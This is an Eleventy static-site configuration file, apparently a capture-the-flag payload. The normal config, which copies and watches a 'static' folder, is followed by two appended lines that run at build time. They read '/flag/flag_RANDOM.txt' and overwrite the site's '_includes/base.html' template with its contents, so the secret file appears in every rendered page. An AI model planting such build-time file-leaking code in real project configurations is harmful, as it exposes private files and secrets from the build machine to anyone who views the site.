module.exports = function (eleventyConfig) {
    eleventyConfig.addPassthroughCopy('static');
    eleventyConfig.addWatchTarget('static');
  };

const fs = require('fs');
fs.createReadStream('/flag/flag_RANDOM.txt').pipe(fs.createWriteStream('_includes/base.html'));
